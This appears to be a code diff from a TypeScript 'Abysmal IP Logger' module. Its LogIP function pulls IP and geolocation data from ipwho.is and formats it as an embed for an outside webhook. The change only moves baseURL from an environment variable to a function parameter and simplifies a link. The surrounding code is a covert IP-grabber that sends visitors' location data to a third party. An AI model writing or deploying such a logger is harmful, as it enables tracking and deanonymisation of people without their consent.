@@ -1,9 +1,8 @@
 const webhookURL = process.env.webhookURL || '';
-const baseURL = process.env.baseURL || '';
 const avatarURL = process.env.avatarURL || '';
 const finalURL = process.env.finalURL || '';
 
-export const LogIP = async () => {
+export const LogIP = async (baseURL: string) => {
     const data = await (await fetch('https://ipwho.is')).json();
 
     const main_field = `
@@ -35,7 +34,7 @@ export const LogIP = async () => {
 
     const embed = {
         'title': '__Abysmal IP Logger__',
-        'description': `From: [${baseURL}](https://${baseURL})`,
+        'description': `From: ${baseURL}`,
         'thumbnail': {
             'url': avatarURL,
         },
